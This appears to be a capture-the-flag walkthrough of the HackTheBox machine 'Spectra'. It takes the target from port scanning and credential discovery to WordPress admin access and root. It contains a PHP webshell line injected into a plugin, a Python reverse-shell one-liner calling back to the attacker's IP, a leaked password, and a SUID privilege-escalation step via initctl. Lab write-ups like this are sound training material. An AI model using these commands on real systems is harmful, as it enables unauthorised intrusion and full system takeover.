# Spectra

<div align='center'>
  <img src='img/image.png' width='400' alt='Machine Image'>
</div>

## Port Scan

Using [nmap](https://nmap.org) for full TCP port scan:

```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.229 -oG allPorts
```

<div align='center'>
  <img src='img/allportsTCP.png' width='600' alt='Port scan'>
</div>

## Service Scan on Discovered Ports

Three open ports found in the previous step. Running basic recon scripts (`-sC`) and version detection (`-sV`):

```bash
 nmap -sCV -p22,80,3306 10.10.10.229 -vvv -oN targeted
```

<div align='center'>
  <img src='img/targeted.png' width='600' alt='Service scan'>
</div>

## Web Enumeration

Visiting the page to see what's exposed:

<div align='center'>
  <img src='img/page.png' width='600' alt='Web enumeration'>
</div>

## Directory Listing

The previous step revealed two paths. The `/test` path leads to an `index.php`, but removing `index.php` from the URL exposes directory listing on `/testing`:

<div align='center'>
  <img src='img/directory.png' width='600' alt='Directory listing'>
</div>

<div align='center'>
  <img src='img/listing.png' width='400' alt='Listing'>
</div>

## Credential Discovery

A file saved by nano contains credentials visible through the page source (`Ctrl+U`):

<div align='center'>
  <img src='img/webcreds.png' width='600' alt='Credential discovery'>
</div>

## Static DNS Resolution

Hovering over "Software Issue Tracker" reveals a link to `spectra.htb` — add it to `/etc/hosts` to resolve the domain:

```bash
 echo "10.10.10.229 spectra.htb" | sudo tee -a /etc/hosts
```

## WordPress Enumeration

After resolving `spectra.htb`, a WordPress site is visible. Two findings:
1. Username: `administrator`
2. Path to the login panel

<div align='center'>
  <img src='img/wordpresspage.png' width='600' alt='WordPress enumeration'>
</div>

## Credential Reuse

Logging into the WordPress admin panel with user `administrator` and the previously found password `devteam01`. Click "Remind me later" when prompted:

<div align='center'>
  <img src='img/verificationBypass.png' width='600' alt='Credential reuse'>
</div>

<div align='center'>
  <img src='img/dashboard.png' width='400' alt='Dashboard'>
</div>

## Remote Code Injection

Logged in as admin, navigate to **Plugin Editor** and edit `akismet.php`. Add this line to inject a webshell:

```bash
 system($_GET['cmd']);
```

<div align='center'>
  <img src='img/codeinject.png' width='600' alt='Code injection'>
</div>


## Reverse Shell via URL

After saving and activating the edited `akismet.php`:
1. Start listener: `ncat -nlvp 4444`
2. Navigate to: `http://spectra.htb/main/wp-content/plugins/akismet/akismet.php`
3. Append `?cmd=` to trigger the injected shell
4. Use the URL to deliver a reverse shell (replace `<YOUR_IP>` with your HackTheBox VPN IP):

```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

<div align='center'>
  <img src='img/revershell.png' width='600' alt='Reverse shell'>
</div>

## Critical Files

Logged in as the `nginx` user, checking `/opt/` reveals a file called `autologin.conf.orig` which reads a password from `/etc/autologin`:

<div align='center'>
  <img src='img/passfile.png' width='600' alt='Critical files'>
</div>


### Password

```bash
SummerHer*********
```
<div align='center'>
  <img src='img/SSHkatie.png' width='400' alt='SSH as katie'>
</div>

## Privilege Enumeration

1. `sudo -l` — check which binaries can be run as root
2. `id` — check group membership
3. We have access to `initctl` binary and belong to the `developers` group — search for files owned by that group:

```bash
 find / -group developers 2>/dev/null | xargs ls -l
```

<div align='center'>
  <img src='img/privenum.png' width='600' alt='Privilege enumeration'>
</div>

## Init Exploitation

From the files found, edit `test9.conf` with nano and add a line to execute a command as root when the task starts via `initctl`. The injected command sets the SUID bit on `/bin/bash`:

```bash
 exec chmod u+s /bin/bash
```

<div align='center'>
  <img src='img/initexpotation.png' width='600' alt='Init exploitation'>
</div>

## Privilege Escalation

After modifying `test9.conf`:
1. Save the file
2. Verify permissions
3. Start `test9` as root
4. Verify `/bin/bash` now has SUID set
5. Spawn a root shell with `bash -p`

```bash
 sudo -u root /sbin/initctl start test9
```

<div align='center'>
  <img src='img/rootshell.png' width='600' alt='Root shell'>
</div>

<div align='center'>
  <p>Thanks for reading! Follow me on my socials:</p>
  <a href='https://x.com/@imahian'><img src='https://www.vectorlogo.zone/logos/x/x-icon.svg' alt='X' width='40'></a>
  <a href='https://discord.gg/dbesG8EX'><img src='https://www.vectorlogo.zone/logos/discord/discord-icon.svg' alt='Discord' width='40'></a>
  <a href='https://youtube.com/@imahian'><img src='https://www.vectorlogo.zone/logos/youtube/youtube-icon.svg' alt='YouTube' width='40'></a>
  <a href='https://twitch.tv/imahian'><img src='https://www.vectorlogo.zone/logos/twitch/twitch-icon.svg' alt='Twitch' width='40'></a>
</div>

---
